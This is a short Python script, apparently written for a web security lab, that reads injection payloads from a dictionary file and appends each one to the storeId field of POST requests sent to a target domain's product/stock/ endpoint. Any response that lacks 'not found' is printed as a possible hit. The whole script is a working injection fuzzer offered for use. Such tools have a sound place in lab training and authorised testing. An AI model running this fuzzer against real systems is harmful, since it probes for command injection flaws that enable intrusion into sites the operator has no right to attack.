import sys
import requests
import time

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} domain")
    sys.exit(1)

URL = sys.argv[1]

f=open("dictionary.txt","r")
path="product/stock/"
for l in f:
    urli = URL+path
    payload='1'+ l.strip()
    data = {'productId':'1','storeId': payload}
    response = requests.post(url=urli,data=data)
    if 'not found' not in response.text:
        print(f"Response : {(response.text).strip()} || Testing Payload : {l}",end="")
    time.sleep(1)
